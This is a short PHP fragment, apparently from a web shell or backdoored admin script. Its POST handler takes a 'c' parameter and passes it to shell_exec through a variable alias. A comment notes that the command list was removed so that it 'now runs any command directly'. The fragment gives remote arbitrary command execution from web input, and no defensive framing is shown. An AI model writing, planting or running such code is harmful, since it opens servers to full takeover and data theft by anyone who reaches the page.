...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    try {
        ...
        // Run Command - **LIST REMOVED: now runs any command directly**
        if (isset($_POST['c']) && !empty($_POST['c'])) {
            $cmd = trim($_POST['c']);
            if (function_exists('shell_exec')) {
                $_SESSION['last_cmd'] = @$se($cmd . " 2>&1");
            } else {
                $_SESSION['last_cmd'] = "shell_exec not available on this PHP.";
                log_error("Attempted to run command but shell_exec not available. Cmd={$cmd}");
            }
        }
